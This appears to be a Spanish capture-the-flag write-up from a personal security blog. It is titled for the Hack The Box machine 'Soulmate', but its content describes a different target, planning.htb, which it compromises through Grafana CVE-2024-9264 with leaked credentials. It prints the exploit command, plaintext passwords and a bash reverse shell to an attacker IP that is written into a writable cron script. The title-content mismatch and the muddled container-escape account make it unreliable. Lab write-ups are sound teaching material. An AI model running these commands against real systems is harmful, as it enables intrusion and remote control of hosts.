<!DOCTYPE html><!-- Layout específico para writeups en markdown. Muestra hero (si existe) y el contenido --><html lang="es" class="dark"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Writeup</title><script type="module">!function(){const t=localStorage.getItem("theme")||"dark";document.documentElement.classList.toggle("light","light"===t),document.documentElement.classList.toggle("dark","dark"===t)}();</script><link rel="stylesheet" href="/assets/contact.fBeTOWmP.css">
<link rel="stylesheet" href="/assets/contact.sk8r29IW.css"></head> <body class="bg-bg1 text-white"> <div class="min-h-screen flex flex-col"> <!-- Header reutiliza el componente global si está disponible --> <header class="w-full py-4"> <div class="container mx-auto flex items-center justify-between"> <a href="/" class="flex items-center gap-3"> <div> <div class="text-lg font-semibold">Angel Corral</div> <div class="text-xs text-slate-400">Ciberseguridad · Hacking Ético</div> </div> </a> <nav class="flex items-center gap-6 text-sm"> <a href="/writeups">Writeups</a> <a href="/projects">Proyectos</a> <a href="/services">Servicios</a> <a href="/contact" class="px-3 py-1 rounded-md border">Contacto</a> <button id="theme-toggle" class="theme-toggle" aria-label="Cambiar tema" type="button"> <svg id="sun-icon" class="hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path> </svg> <svg id="moon-icon" class="block" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"> <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path> </svg> </button> <script type="module">!function(){const e=document.getElementById("theme-toggle"),t=document.getElementById("sun-icon"),s=document.getElementById("moon-icon"),d=document.documentElement;function c(){return localStorage.getItem("theme")||"dark"}function l(e){"light"===e?(d.classList.remove("dark"),d.classList.add("light"),t.classList.remove("hidden"),t.classList.add("block"),s.classList.remove("block"),s.classList.add("hidden")):(d.classList.remove("light"),d.classList.add("dark"),s.classList.remove("hidden"),s.classList.add("block"),t.classList.remove("block"),t.classList.add("hidden")),localStorage.setItem("theme",e)}l(c()),e.addEventListener("click",()=>{l("light"===c()?"dark":"light")})}();</script> </nav> </div> </header> <main class="container mx-auto px-6 py-10 flex-1"> <article class="max-w-3xl mx-auto">  <div class="prose prose-invert prose-xl max-w-none">   <article class="max-w-5xl mx-auto px-6 py-12"> <!-- ENCABEZADO --> <div class="mb-14 text-center"> <a href="/writeups" class="text-sm text-slate-400 hover:text-accentBlue transition-colors block mb-4">
← Volver a Writeups
</a> <h1 class="text-5xl font-bold bg-gradient-to-r from-accentBlue to-accentGreen text-transparent bg-clip-text mb-4"> Soulmate HTB </h1> <p class="text-slate-400 text-sm mb-2">10 de septiembre de 2025</p> <p class="text-lg text-slate-300 max-w-2xl mx-auto mb-6 leading-relaxed"> Escalada de privilegios en servicio mal configurado. Writeup de HTB. </p> </div> <!-- BLOQUE DE INFORMACIÓN TÉCNICA --> <section class="grid md:grid-cols-2 gap-6 mb-12 text-sm"> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentBlue text-lg font-semibold mb-3">Detalles Técnicos</h2> <ul class="space-y-2 text-slate-300">    <li><strong>Dificultad:</strong> Intermedio</li> </ul> </div> <div class="bg-slate-900/50 border border-slate-800 p-5 rounded-xl backdrop-blur-sm"> <h2 class="text-accentGreen text-lg font-semibold mb-3">Etiquetas y Tecnología</h2> <div class="flex flex-wrap gap-2"> <span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> htb </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> privilege-escalation </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> web </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> grafana </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> cve-2024-9264 </span><span class="px-3 py-1 rounded-full bg-slate-800/60 text-slate-300 border border-slate-700 text-sm"> docker </span> </div> </div> </section> <!-- IMAGEN DESTACADA -->  <div class="prose-writeup"> <p><img src="/img/soulmatehtb.png" alt="Banner SoulMate"></p>
<p><strong>Objetivo:</strong> <code>IP: 10.10.11.68</code> <br>
<strong>Dominio:</strong> <code>planning.htb</code> <br>
<strong>Plataforma:</strong> <code>Hack The Box</code> <br>
<strong>Dificultad:</strong> <strong>Intermedio</strong></p>
<h2 id="-configuración-inicial">💻 Configuración Inicial</h2>
<p>Para asegurar la documentación completa y organizada, se creó la siguiente estructura de carpetas:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4"># Script para crear estructura de carpetas</span></span>
<span class="line"><span style="color:#6272A4">#!/bin/bash</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD93F9">MAQUINA</span><span style="color:#FF79C6">=</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">soulmate</span><span style="color:#E9F284">"</span><span style="color:#6272A4"> # Ejemplo</span></span>
<span class="line"><span style="color:#50FA7B">mkdir</span><span style="color:#BD93F9"> -p</span><span style="color:#E9F284"> "</span><span style="color:#BD93F9">$MAQUINA</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">/{content,nmap,scripts}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">Estructura creada:</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">├── </span><span style="color:#BD93F9">$MAQUINA</span><span style="color:#F1FA8C">/</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">    ├── content/ (Archivos de la web, dumps, etc.)</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">    ├── nmap/ (Resultados de escaneos)</span><span style="color:#E9F284">"</span></span>
<span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">    └── scripts/ (Exploits, shell reversa, linpeas, etc.)</span><span style="color:#E9F284">"</span></span></code></pre>
<p><strong>Credenciales Iniciales (Si existen):</strong></p>























<table><thead><tr><th align="left">Servicio</th><th align="left">Usuario</th><th align="left">Contraseña</th><th align="left">Notas</th></tr></thead><tbody><tr><td align="left"><strong>Web (Admin)</strong></td><td align="left"><code>admin</code></td><td align="left"><code>0D5oT70Fq13EvB5r</code></td><td align="left">Encontradas vía enumeración / leak.</td></tr><tr><td align="left"><strong>SSH</strong></td><td align="left"></td><td align="left"></td><td align="left">Pendiente de obtener.</td></tr></tbody></table>
<hr>
<h2 id="-fase-1-escaneo-y-enumeración">🔎 Fase 1: Escaneo y Enumeración</h2>
<h3 id="-escaneo-de-puertos-nmap">🌐 Escaneo de Puertos (<code>nmap</code>)</h3>
<p>Se realizó un escaneo completo de puertos (<code>-p-</code>), seguido de una detección de servicios y scripts comunes (<code>-sSCV</code>) en los puertos abiertos.</p>
<p><strong>Comandos:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sS</span><span style="color:#BD93F9"> -p-</span><span style="color:#BD93F9"> --open</span><span style="color:#BD93F9"> -T4</span><span style="color:#BD93F9"> -vvv</span><span style="color:#BD93F9"> -n</span><span style="color:#BD93F9"> -Pn</span><span style="color:#BD93F9"> 10.10.11.68</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> nmap/initial_scan.txt</span></span>
<span class="line"><span style="color:#50FA7B">nmap</span><span style="color:#BD93F9"> -sSCV</span><span style="color:#BD93F9"> -p22,80</span><span style="color:#BD93F9"> 10.10.11.68</span><span style="color:#BD93F9"> -oN</span><span style="color:#F1FA8C"> nmap/service_scan.txt</span></span></code></pre>
<p><strong>Resultados Destacados:</strong></p>























<table><thead><tr><th align="left">Puerto</th><th align="left">Servicio</th><th align="left">Versión</th><th align="left">Notas</th></tr></thead><tbody><tr><td align="left"><strong>22/tcp</strong></td><td align="left"><code>ssh</code></td><td align="left">OpenSSH 9.6p1</td><td align="left"><strong>OpenSSH 9.6p1</strong> (Ubuntu)</td></tr><tr><td align="left"><strong>80/tcp</strong></td><td align="left"><code>http</code></td><td align="left">nginx 1.24.0</td><td align="left"><strong>nginx 1.24.0</strong> (Ubuntu)</td></tr></tbody></table>
<h3 id="-enumeración-web-puerto-80">🔍 Enumeración Web (Puerto 80)</h3>
<p>El puerto 80 redirige a <code>http://planning.htb/</code>. Se añadió el dominio al archivo <code>/etc/hosts</code>.</p>
<h4 id="descubrimiento-de-directorios-gobusterffuf">Descubrimiento de Directorios (<code>gobuster/ffuf</code>)</h4>
<p>Se utilizó <strong>Gobuster</strong> para encontrar rutas:</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> dir</span><span style="color:#BD93F9"> -u</span><span style="color:#F8F8F2"> [http://planning.htb](</span><span style="color:#50FA7B">http://planning.htb</span><span style="color:#F8F8F2">) -w /usr/share/wordlists/dirb/common.txt -t 50</span></span></code></pre>
<p><strong>Directorios Encontrados:</strong> <code>/img</code>, <code>/css</code>, <code>/lib</code>, <code>/js</code>, <code>/api</code>, <code>/apis</code>, <code>/apidocs</code>.</p>
<h4 id="subdominios-y-vhosts">Subdominios y Vhosts</h4>
<p>La herramienta <strong>WhatWeb</strong> y la inspección manual revelaron la tecnología web: <strong>Bootstrap</strong>, <strong>JQuery 3.4.1</strong>, <strong>nginx/1.24.0</strong>, y una mención a un posible servicio <strong>Grafana</strong>.</p>
<p>Se realizó un escaneo de subdominios, revelando un host crucial: <code>grafana.planning.htb</code>.</p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#6272A4"># Comando de ejemplo para vhosts/subdominios</span></span>
<span class="line"><span style="color:#50FA7B">gobuster</span><span style="color:#F1FA8C"> vhost</span><span style="color:#BD93F9"> -u</span><span style="color:#F8F8F2"> [http://planning.htb](</span><span style="color:#50FA7B">http://planning.htb</span><span style="color:#F8F8F2">) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain</span></span></code></pre>
<p><strong>Subdominio Clave:</strong> <code>grafana.planning.htb</code> (Grafana 11.0.0).</p>
<hr>
<h2 id="-fase-2-explotación-obtención-de-acceso">💥 Fase 2: Explotación (Obtención de Acceso)</h2>
<h3 id="-ataque-a-grafana-cve-2024-9264">🎯 Ataque a Grafana (CVE-2024-9264)</h3>
<p>La instancia de <strong>Grafana 11.0.0</strong> en <code>grafana.planning.htb</code> presentaba la <strong>CVE-2024-9264</strong> (Arbitrary File Write / RCE).</p>
<p><strong>Pasos:</strong></p>
<ol>
<li>Se utilizaron las credenciales encontradas (<code>admin / 0D5oT70Fq13EvB5r</code>).</li>
<li>Se identificó un <em>exploit</em> de Python en GitHub: <a href="https://github.com/nollium/CVE-2024-9264">https://github.com/nollium/CVE-2024-9264</a>.</li>
<li>Se ejecutó el <em>exploit</em> con una <em>reverse shell</em> de <strong>Perl</strong>.</li>
</ol>
<p><strong>Comando de Explotación:</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">python3</span><span style="color:#F1FA8C"> CVE-2024-9264.py</span><span style="color:#BD93F9"> -u</span><span style="color:#F1FA8C"> admin</span><span style="color:#BD93F9"> -p</span><span style="color:#F1FA8C"> 0D5oT70Fq13EvB5r</span><span style="color:#BD93F9"> -c</span><span style="color:#E9F284"> '</span><span style="color:#F1FA8C">perl rev_perl.sh</span><span style="color:#E9F284">'</span><span style="color:#F8F8F2"> [http://grafana.planning.htb](</span><span style="color:#50FA7B">http://grafana.planning.htb</span><span style="color:#F8F8F2">)</span></span></code></pre>
<p><strong>Resultado:</strong> Obtención de una <em>reverse shell</em> como el usuario <strong><code>root</code></strong> dentro del contenedor <strong>Docker</strong> de Grafana.</p>
<hr>
<h2 id="️-fase-3-escalada-de-privilegios-root">⬆️ Fase 3: Escalada de Privilegios (Root)</h2>
<h3 id="-pivoteo-y-escape-del-contenedor">🚪 Pivoteo y Escape del Contenedor</h3>
<p>Una vez dentro del contenedor (como <code>root</code>), se ejecutó <code>linpeas.sh</code> para buscar <em>leaks</em> de información y vectores de escape.</p>
<p><strong>Apuntes de la Enumeración:</strong></p>
<ol>
<li><strong>Variables de Entorno:</strong> Se encontraron credenciales para otro usuario:
<ul>
<li><code>GF_SECURITY_ADMIN_USER=enzo</code></li>
<li><code>GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!</code></li>
</ul>
</li>
<li><strong>Tareas Programadas (<code>crontab.db</code>):</strong> Dos tareas llamaron la atención.
<ul>
<li>Una tarea diaria que hace un <code>docker save</code> del contenedor <code>root_grafana</code>, lo comprime y lo cifra con <strong><code>zip -P P4ssw0rdS0pRi0T3c</code></strong>.</li>
<li>Una tarea recurrente (<code>* * * * *</code>) que ejecuta el script <code>/root/scripts/cleanup.sh</code>.</li>
</ul>
</li>
</ol>
<h3 id="-compromiso-de-root-contenedor">🔑 Compromiso de Root (Contenedor)</h3>
<p><strong>Vector de Escalada:</strong> La tarea <strong>Cleanup</strong> se ejecuta cada minuto, y el <em>script</em> <code>/root/scripts/cleanup.sh</code> es <strong>escribible</strong> por el usuario actual (<code>root</code> del contenedor).</p>
<p><strong>Explotación:</strong></p>
<ol>
<li>Se modificó <code>/root/scripts/cleanup.sh</code> para contener una <em>reverse shell</em> simple.</li>
<li>Al minuto, la <em>reverse shell</em> se ejecutó con los privilegios del <em>host</em> (debido a cómo Docker ejecuta <code>cron</code> en este contexto).</li>
</ol>
<p><strong>Script de Modificación (ejemplo):</strong></p>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">bash -i >&#x26; /dev/tcp/10.10.14.X/4445 0>&#x26;1</span><span style="color:#E9F284">"</span><span style="color:#FF79C6"> ></span><span style="color:#F1FA8C"> /root/scripts/cleanup.sh</span></span>
<span class="line"><span style="color:#6272A4"># Luego, se esperó la conexión en el listener</span></span></code></pre>
<p><strong>Credencial Root Final:</strong> Se encontró la contraseña <code>P4ssw0rdS0pRi0T3c</code> en el comando <code>zip</code> de la tarea de <em>backup</em>. Esta podría ser una pista para otras credenciales, o la propia <em>password</em> del <code>root</code> del <em>host</em> (dependiendo de la máquina).</p>
<hr>
<h2 id="-resumen-y-conclusiones">📌 Resumen y Conclusiones</h2>





































<table><thead><tr><th align="left">Categoría</th><th align="left">Detalle Clave</th></tr></thead><tbody><tr><td align="left"><strong>Puertos Abiertos</strong></td><td align="left">22 (SSH), 80 (HTTP/NGINX)</td></tr><tr><td align="left"><strong>Servicio Clave</strong></td><td align="left">Grafana 11.0.0 en <code>grafana.planning.htb</code></td></tr><tr><td align="left"><strong>Credenciales Útiles</strong></td><td align="left"><code>admin:0D5oT70Fq13EvB5r</code> (Web), <code>enzo:RioTecRANDEntANT!</code> (Env Var)</td></tr><tr><td align="left"><strong>Vulnerabilidad</strong></td><td align="left"><strong>CVE-2024-9264</strong> (RCE en Grafana)</td></tr><tr><td align="left"><strong>Escalada de Privs</strong></td><td align="left"><strong>Cronjob Escribible</strong> (<code>/root/scripts/cleanup.sh</code>) dentro del contenedor.</td></tr><tr><td align="left"><strong>Flag Root</strong></td><td align="left">Obtenida tras el <em>escape</em> del contenedor.</td></tr><tr><td align="left"><strong>Notas Adicionales</strong></td><td align="left">La <em>password</em> <code>P4ssw0rdS0pRi0T3c</code> de la tarea de <em>backup</em> fue una pista crucial.</td></tr></tbody></table>
<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span></span></span></code></pre> </div> <!-- FOOTER DEL ARTÍCULO --> <div class="mt-16 pt-8 border-t border-slate-800 text-center"> <a href="/writeups" class="text-slate-400 hover:text-accentBlue transition-colors">
← Volver a la lista de writeups
</a> </div> </article>   </div> </article> </main> <footer class="w-full py-6 mt-12"> <div class="container mx-auto text-sm text-slate-400">
© 2025 Angel Corral — Ciberseguridad
</div> </footer> </div> </body></html>